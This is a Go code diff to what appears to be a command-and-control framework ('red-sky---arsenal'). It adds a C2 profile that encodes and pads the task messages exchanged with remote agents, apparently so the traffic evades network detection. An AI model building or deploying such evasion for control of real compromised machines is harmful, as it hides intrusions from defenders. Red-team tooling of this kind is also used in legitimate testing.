@@ -13,6 +13,8 @@ import (
 	"github.com/sk666G/red-sky---arsenal/internal/crypto"
 	"github.com/sk666G/red-sky---arsenal/internal/proto"
 	"github.com/sk666G/red-sky---arsenal/internal/wire"
+
+	"github.com/sk666G/red-sky---arsenal/internal/c2profile"
 )
 
 // TaskState is the lifecycle stage of a task.
@@ -119,6 +121,10 @@ func (s *Session) Tasks() []*Task {
 // --- Manager ---
 
 // Manager tracks all live sessions.
+// activeProfile is the loaded c2 profile consulted by the
+// per-session send and read helpers. Nil means no encode/pad.
+var activeProfile *c2profile.Profile
+
 type Manager struct {
 	emitMu    sync.RWMutex
 	done      chan struct{}
@@ -261,6 +267,14 @@ func (m *Manager) writerLoop(s *Session) {
 		}
 		env := proto.Envelope{Type: proto.TypeTask, Payload: payload}
 		envBytes, _ := json.Marshal(env)
+		if activeProfile != nil {
+			body, err := activeProfile.EncodeBody(envBytes)
+			if err != nil {
+				m.emit("error", s.AgentID, "encode body: "+err.Error())
+				continue
+			}
+			envBytes = activeProfile.PadBody(body)
+		}
 		enc, err := s.crypto.Encrypt(envBytes)
 		if err != nil {
 			m.emit("error", s.AgentID, "encrypt task: "+err.Error())
@@ -306,6 +320,15 @@ func (m *Manager) readerLoop(s *Session) {
 		if err != nil {
 			m.emit("error", s.AgentID, "decrypt: "+err.Error())
 			continue
+		}
+		if activeProfile != nil {
+			plain = c2profile.StripPadding(plain)
+			dec, err := activeProfile.DecodeBody(plain)
+			if err != nil {
+				m.emit("error", s.AgentID, "decode body: "+err.Error())
+				continue
+			}
+			plain = dec
 		}
 		var env proto.Envelope
 		if err := json.Unmarshal(plain, &env); err != nil {
